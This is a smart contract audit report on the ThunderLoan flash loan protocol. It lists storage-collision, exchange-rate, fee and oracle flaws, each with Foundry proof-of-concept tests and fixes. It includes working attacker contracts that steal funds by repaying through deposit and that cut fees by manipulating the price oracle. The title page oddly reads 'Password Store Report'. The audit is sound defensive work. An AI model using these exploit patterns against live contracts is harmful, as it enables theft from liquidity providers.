---
header-includes:
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.jpg} 
    \end{figure}
    \vspace*{1cm}
    {\Huge\bfseries Password Store Report\par}
    \vspace{1cm}
    {\Large Performed by: \itshape 0xShiki\par}
\end{titlepage}

# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Scope Details](#audit-scope-details)
  - [Roles](#roles)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [\[H-1\] Storage collision during upgrade](#h-1-storage-collision-during-upgrade)
    - [Relevant GitHub Links](#relevant-github-links)
    - [Description:](#description)
    - [Impact](#impact)
    - [Proof of Concept](#proof-of-concept)
    - [Tools Used](#tools-used)
    - [Recommended Mitigation](#recommended-mitigation)
  - [\[H-2\] Incorrect update of `exchangeRate` in `THunderLoan::deposit` function](#h-2-incorrect-update-of-exchangerate-in-thunderloandeposit-function)
    - [Relevant GitHub Links](#relevant-github-links-1)
    - [Description](#description-1)
    - [Impact](#impact-1)
    - [Proof of Concept](#proof-of-concept-1)
    - [Tools Used](#tools-used-1)
    - [Recommended Mitigation](#recommended-mitigation-1)
  - [\[H-3\] Miscalculation of fees when dealing with non-standard ERC20 tokens with less than 18 decimals](#h-3-miscalculation-of-fees-when-dealing-with-non-standard-erc20-tokens-with-less-than-18-decimals)
    - [Relevant GitHub Links](#relevant-github-links-2)
    - [Description](#description-2)
    - [Impact](#impact-2)
    - [Proof of Concept](#proof-of-concept-2)
    - [Tools Used](#tools-used-2)
    - [Recommended Mitigation](#recommended-mitigation-2)
  - [\[H-4\] Flash loan can be returned using the `deposit` function, leading to stolen funds](#h-4-flash-loan-can-be-returned-using-the-deposit-function-leading-to-stolen-funds)
    - [Relevant GitHub Links](#relevant-github-links-3)
    - [Description](#description-3)
    - [Impact](#impact-3)
    - [Proof of Concept](#proof-of-concept-3)
    - [Tools Used](#tools-used-3)
    - [Recommended Mitigation](#recommended-mitigation-3)
  - [\[M-1\] Owner can lock liquidity providers from redeeming their funds from the contract](#m-1-owner-can-lock-liquidity-providers-from-redeeming-their-funds-from-the-contract)
    - [Relevant GitHub Links](#relevant-github-links-4)
    - [Description](#description-4)
    - [Impact](#impact-4)
    - [Proof of Concept](#proof-of-concept-4)
    - [Tools Used](#tools-used-4)
    - [Recommended Mitigation](#recommended-mitigation-4)
  - [\[M-2\] Flashloan fee can be minimized via price oracle manipulation](#m-2-flashloan-fee-can-be-minimized-via-price-oracle-manipulation)
    - [Relevant GitHub Links](#relevant-github-links-5)
    - [Description:](#description-5)
    - [Impact:](#impact-5)
    - [Proof of Concept:](#proof-of-concept-5)
    - [Tools Used](#tools-used-5)
    - [Recommended Mitigation](#recommended-mitigation-5)
  - [\[M-3\] `ThunderLoan` not compatible with Fee on Transfer tokens, leading to drained and locked user funds](#m-3-thunderloan-not-compatible-with-fee-on-transfer-tokens-leading-to-drained-and-locked-user-funds)
    - [Relevant GitHub Links](#relevant-github-links-6)
    - [Description](#description-6)
    - [Impact](#impact-6)
    - [Proof of Concept](#proof-of-concept-6)
    - [Tools Used](#tools-used-6)
    - [Recommended Mitigation](#recommended-mitigation-6)
  - [\[L-1\] Flashloan fee can be 0 for small amounts](#l-1-flashloan-fee-can-be-0-for-small-amounts)
    - [Relevant GitHub Links](#relevant-github-links-7)
    - [Description](#description-7)
    - [Impact](#impact-7)
    - [Proof of Concept](#proof-of-concept-7)
    - [Tools Used](#tools-used-7)
    - [Recommended Mitigation](#recommended-mitigation-7)
  - [\[I-1\] Interface `IThunderLoan` not implemented in `ThunderLoan`](#i-1-interface-ithunderloan-not-implemented-in-thunderloan)
  - [\[I-2\] In `IThunderLoan::repay` function the `token` parameter should be of type `IERC20` not `address`](#i-2-in-ithunderloanrepay-function-the-token-parameter-should-be-of-type-ierc20-not-address)
  - [\[I-3\] No address(0) check in `OracleUpgradeable::__Oracle_init` function](#i-3-no-address0-check-in-oracleupgradeable__oracle_init-function)
  - [\[G-1\] In `AssetToken::updateExchangeRate` function `s_exchangeRate` is read from storage too many times](#g-1-in-assettokenupdateexchangerate-function-s_exchangerate-is-read-from-storage-too-many-times)
    - [Description](#description-8)
    - [Recommended Mitigation](#recommended-mitigation-8)
  - [\[G-2\] `ThunderLoan::s_feePrecision` and `ThunderLoan::s_flashLoanFee` should be constant](#g-2-thunderloans_feeprecision-and-thunderloans_flashloanfee-should-be-constant)
  - [\[G-3\] `ThunderLoan::getAssetFromToken` and `ThunderLoan::isCurrentlyFlashLoaning` can be marked as `external`](#g-3-thunderloangetassetfromtoken-and-thunderloaniscurrentlyflashloaning-can-be-marked-as-external)

# Protocol Summary
The `ThunderLoan` protocol is meant to do the following:

1. Give users a way to create flash loans
2. Give liquidity providers a way to earn money off their capital
Liquidity providers can deposit assets into ThunderLoan and be given AssetTokens in return. These AssetTokens gain interest over time depending on how often people take out flash loans!

Users additionally have to pay a small fee to the protocol depending on how much money they borrow. To calculate the fee, we're using the famous on-chain TSwap price oracle.

# Disclaimer
A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource and expertise bound effort where I try to find as many vulnerabilities as possible. I can not guarantee 100% security after the review or even if the review will find any problems with your smart contracts. Subsequent security reviews, bug bounty programs and on-chain monitoring are strongly recommended.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

# Audit Scope Details

- Commit Hash: 8803f851f6b37e99eab2e94b4690c8b70e26b3f6
- In Scope:
```
src/interfaces/IFlashLoanReceiver.sol
src/interfaces/IPoolFactory.sol
src/interfaces/ITSwapPool.sol
src/interfaces/IThunderLoan.sol
src/protocol/AssetToken.sol
src/protocol/OracleUpgradeable.sol
src/protocol/ThunderLoan.sol
src/upgradedProtocol/ThunderLoanUpgraded.sol
```

- Solc Version: 0.8.20
- Chain(s) to deploy contract to: Ethereum
- ERC20s:
  - USDC 
  - DAI
  - LINK
  - WETH

## Roles

- Owner: The owner of the protocol who has the power to upgrade the implementation. 
- Liquidity Provider: A user who deposits assets into the protocol to earn interest. 
- User: A user who takes out flash loans from the protocol.

## Issues found
| Severtity | Number of issues found |
| --------- | ---------------------- |
| High      | 4                      |
| Medium    | 3                      |
| Low       | 1                      |
| Gas       | 3                      |
| Info      | 3                      |
| Total     | 14                     |


# Findings

## [H-1] Storage collision during upgrade

### Relevant GitHub Links
- https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L96C1-L100C1
- https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/upgradedProtocol/ThunderLoanUpgraded.sol#L95C5-L101C1

### Description:
At storage slot 1, 2 and 3 of `ThunderLoan.sol` contract are `s_feePrecision`, `s_flashLoanFee` and `s_currentlyFlashLoaning` respectively. In the `ThunderLoanUpgraded` contract at storage slot 1 and 2 are `s_flashLoanFee` and `s_currentlyFlashLoaning`. This is because in the upgradeable contract `s_feePrecision` is changed to a constant variable. In that way 2 things will happen:
    - fee for flashloan will be miscalculated
    - users will pay the same amount of what they borrowed in fees

### Impact
- fee for flashloan will be miscalculated
- users will pay the same amount of what they borrowed in fees
  
### Proof of Concept
State variables of `ThunderLoan.sol` contract:
```javascript
    mapping(IERC20 => AssetToken) public s_tokenToAssetToken;
    uint256 private s_feePrecision; 
    uint256 private s_flashLoanFee; // 0.3% ETH fee 
    mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```

State variables of `ThunderLoanUpgraded.sol` contract:
```javascript
    mapping(IERC20 => AssetToken) public s_tokenToAssetToken;
    uint256 private s_flashLoanFee; // 0.3% ETH fee 
    uint256 public constant FEE_PRECISION = 1e18;
    mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```

As we can see the storage layout of the `ThunderLoan.sol` contract is different from the `ThunderLoanUpgraded.sol` contract.

### Tools Used
Manual Review

### Recommended Mitigation
Leave a blank storage slot if you are going to replace a storage variable to be a constant:
```diff
    mapping(IERC20 => AssetToken) public s_tokenToAssetToken;
+   uint256 private s_blank;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
    mapping(IERC20 token => bool currentlyFlashLoaning) private s_currentlyFlashLoaning;
```

## [H-2] Incorrect update of `exchangeRate` in `THunderLoan::deposit` function

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L153-L154
```

### Description
On every deposit the exchange rate for asset token is updated, which can lead to users withdrawing more funds immediately. Underlying asset token can be completely drained.

### Impact
Since the exchange rate is updated on deposit:
- users can withdraw their funds immedialtely after depositing, in order to withdraw more funds than they deposited.
- if a liquidity provider deposits funds and a user takes out a flash loan, it will be impossible for the liquidity provider to withdraw their funds.

### Proof of Concept

<details>
<summary>Code</summary>

Place the following in `test/ThunderLoan.t.sol`:

```javascript
    function testRedeemFailsAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
    }
```

</details>

### Tools Used
Manual Review

### Recommended Mitigation

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);

-       uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);

        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

## [H-3] Miscalculation of fees when dealing with non-standard ERC20 tokens with less than 18 decimals

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L248-L250

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/upgradedProtocol/ThunderLoanUpgraded.sol#L246-L248
```

### Description
The function `Thunderloan::getCalculatedFee` calculates the fee for users who take out flashloans. However, fees will be lower than expected if we deal with a token with less than 18 decimals (for example USDC, which has 6 decimals).

### Impact
- Users will pay less fees than expected when dealing with tokens with less than 18 decimals.

### Proof of Concept
Scenario:
1. User 1 takes out a flash loan of 1 ETH which is 1e18 wei.
2. User 2 takes out a flash loan of 2000 USDC which is 2000e6 (2e9) wei.

- For User 1 `valueOfBorrowedToken` = (1e18 * 1e18) / 1e18 = 1e18 wei
- For User 2 `valueOfBorrowedToken` = (2e9 * 1e18) / 1e18 = 2e9 wei

- `fee` for User 1 = (1e18 * 3e15) / 1e18 = 3e15 wei (or 0,003 ETH)
- `fee` for User 2 = (2e9 * 3e15) / 1e18 = 6e6 wei (or 0,000000000006)

The function used for calculating the fee:

```javascript
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
}
```

### Tools Used
Manual Review

### Recommended Mitigation
Consider adding logic to you contract for dealing with non-standard ERC20 tokens with less than 18 decimals.

## [H-4] Flash loan can be returned using the `deposit` function, leading to stolen funds

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L147-L156

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L180-L217
```

### Description
The function `ThunderLoan::deposit` allows users to deposit funds into the protocol. If a user takes out a flash loan using `ThunderLoan::flashloan` function, they can return the flash loan using the deposit function. In that way they can mint to themselves `AssetToken` tokens without providing any collateral, and later redeem them, which will lead to stolen funds.

### Impact
- Users can steal funds from the protocol by returning flash loans using the deposit function.

### Proof of Concept
- Attacker contract:

```javascript
    contract DepositOverRepay is IFlashLoanReceiver {
        ThunderLoan thunderLoan;
        AssetToken assetToken;
        IERC20 s_token;

        constructor(address _thunderLoan) {
            thunderLoan = ThunderLoan(_thunderLoan);
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address, /* initiator */
            bytes calldata /* params */
        )
            external
            returns (bool)
        {
            s_token = IERC20(token);
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.deposit(IERC20(token), amount + fee);

            return true;
        }

        function redeemMoney() public {
            uint256 amount = assetToken.balanceOf(address(this));
            thunderLoan.redeem(s_token, amount);
        }
    }
```

- Test function:
```javascript
    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);

        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();

        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
    }
```

### Tools Used
Manual Review

### Recommended Mitigation
Add a check in deposit() to make it impossible to use it in the same block of the flash loan.

## [M-1] Owner can lock liquidity providers from redeeming their funds from the contract

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L227-L244
```

### Description
The function `ThunderLoan::setAllowedToken` is used for allowing and removing tokens from the protocol and it is called only by the owner. If the owner calls the function for removing a token and a user has deposited of that token in the protocol, the function will remove the token from the `s_tokenToAssetToken` mapping and user won't be able to redeem their funds.

### Impact
User's funds can get locked in the protocol.

### Proof of Concept
Add the following test in `test/ThunderLoan.t.sol`:

```javascript
    function testCannotRedeemNonAllowedTokenAfterDepositingToken() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);

        tokenA.mint(liquidityProvider, AMOUNT);
        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, false);

        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, AMOUNT_LESS);
        vm.stopPrank();
    }
```

### Tools Used
Manual Review

### Recommended Mitigation
Consider adding a check if a user holds that assetToken in the protocol, therefore preventing from removing it.

## [M-2] Flashloan fee can be minimized via price oracle manipulation

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L201-L210

https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L192
```

### Description:
`ThunderLoan` uses `TSwap` for determining the price of the token by how many reserves are on either side of the pool. If an attacker can manipulate the price of the token by buying and selling a large amount of the token, they can minimize the flashloan fee.

### Impact:
- Users can minimize the flashloan fee by manipulating the price of the token.

### Proof of Concept:
1. User takes out a flash loan for 1000 TokenA.
2. During the flashloan they do the following:
   1. User sells 1000 TokenA, tanking the price in the pool.
   2. Instead of repaying right away they take another flashloan for 1000 TokenA.
   3. Due to the fact that `ThunderLoan` calculates the price based on `TSwapPool` the second flashloan will be cheaper.
   4. The user repays the first flashloan, and then the second with lowered fee.

Paste the following snippet of code in `test/ThunderLoan.t.sol`:

<details>
<summary>Attacker</summary>

```javascript
    contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
        // swap tokenA for weth
        // take out another flash loan

        BuffMockTSwap tswap;
        ThunderLoan thunderLoan;
        address repayAddress;

        bool attacked;
        uint256 public fee1;
        uint256 public fee2;

        constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
            tswap = BuffMockTSwap(_tswapPool);
            thunderLoan = ThunderLoan(_thunderLoan);
            repayAddress = _repayAddress;
        }

        function executeOperation(
            address token,
            uint256 amount,
            uint256 fee,
            address, /* initiator */
            bytes calldata /* params */
        )
            external
            returns (bool)
        {
            if (!attacked) {
                fee1 = fee;
                attacked = true;
                // swap tokenA for weth
                // take out another flash loan
                uint256 wethBought = tswap.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                IERC20(token).approve(address(tswap), 50e18);
                tswap.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

                thunderLoan.flashloan(address(this), IERC20(token), amount, "");

                // repay
                IERC20(token).transfer(repayAddress, amount + fee);
            } else {
                // calculate fee
                fee2 = fee;
                // repay
                IERC20(token).transfer(repayAddress, amount + fee);
            }

            return true;
        }
    }
```

</details>

<details>
<summary>Test</summary>

```javascript
    function testOracleManipulation() public {
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        address tswapPool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // fund tswap
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(tswapPool, 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(tswapPool, 100e18);
        // ration is 1:1
        BuffMockTSwap(tswapPool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();

        // allow tokenA in thunderloan
        vm.startPrank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        vm.stopPrank();

        // fund thunderloan
        // - have 100 WETH and 100 tokenA in TSwap Pool
        // - have 1000 tokenA in ThunderLoan, which we can borrow
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);

        // take out 2 flash loans
        //  - nukes the price of weth/tokenA on TSwap
        //  - show that reduces fees we pay on ThunderLoan
        uint256 normalFeeCost = thunderLoan.getCalculatedFee(tokenA, 100e18);
        console2.log("NormalFee >>> ", normalFeeCost); // 0.296147410319118389 (~0.3)

        uint256 amountToBorrow = 50e18; // we gonna do it twice

        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(
            address(tswapPool), address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA))
        );

        vm.startPrank(user);
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");

        vm.stopPrank();

        uint256 attackFee = flr.fee1() + flr.fee2();

        console2.log("Attack fee is >>> ", attackFee);
        assert(attackFee < normalFeeCost);
    }
```
</details>

### Tools Used
Manual Review

### Recommended Mitigation
Consider using a Chainlink Oracle for determining the price of the token.

## [M-3] `ThunderLoan` not compatible with Fee on Transfer tokens, leading to drained and locked user funds

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#147-156
```

### Description
When providing liquidity using `ThunderLoan::deposit` function, there are tokens like `STA` or `PAXG`, which have a fee on transfering. In that way, when a user deposits these tokens into the protocol, the protocol will not receive the full amount of the token, and could lead to potential loss of funds.

### Impact
- Users can lose funds when depositing tokens with a fee on transfer.

### Proof of Concept
1. Alice deposits 100 `STA` tokens in the protocol, receives 100 `AssetToken` tokens.
2. Since `STA` has a 1% fee on transfer, the protocol will receive 99 `STA` tokens.
3. Bob deposits 200 `STA` tokens in the protocol, receives 200 `AssetToken` tokens.
4. Since `STA` has a 1% fee on transfer, the protocol will receive 198 `STA` tokens.
5. If Alice tries to withdraw her funds, Bob can frontrun her by redeeming all of his tokens, and in that way Alice won't be able to claim her underlying amount.


### Tools Used
Manual Review

### Recommended Mitigation
Implement logic to handle fee on transfer tokens, for example calculate the difference between the amount before depositing and after depositing, and then mint the user the correct amount of `AssetToken` tokens.

## [L-1] Flashloan fee can be 0 for small amounts

### Relevant GitHub Links
```
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L246
```

### Description
If amount of flashloan is 333 or less, the fee calculation can result to 0

### Impact
- Users can take out flashloans for small amounts without paying any fees

### Proof of Concept
```javascript
    function testZeroFlashloanFee() public {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            333
        );

        assertEq(calculatedFee, 0);
    }
```

### Tools Used
Manual Review

### Recommended Mitigation
A minimum fee check can be implemented in the function.

## [I-1] Interface `IThunderLoan` not implemented in `ThunderLoan`

## [I-2] In `IThunderLoan::repay` function the `token` parameter should be of type `IERC20` not `address`

## [I-3] No address(0) check in `OracleUpgradeable::__Oracle_init` function

## [G-1] In `AssetToken::updateExchangeRate` function `s_exchangeRate` is read from storage too many times
### Description
```javascript
    function updateExchangeRate(uint256 fee) external onlyThunderLoan {
        uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();

        if (newExchangeRate <= s_exchangeRate) {
            revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
        }
        s_exchangeRate = newExchangeRate;
        emit ExchangeRateUpdated(s_exchangeRate);
    }
```

### Recommended Mitigation
Consider storing `s_exchangeRate` in a local variable before using it in the calculation.

## [G-2] `ThunderLoan::s_feePrecision` and `ThunderLoan::s_flashLoanFee` should be constant

## [G-3] `ThunderLoan::getAssetFromToken` and `ThunderLoan::isCurrentlyFlashLoaning` can be marked as `external`



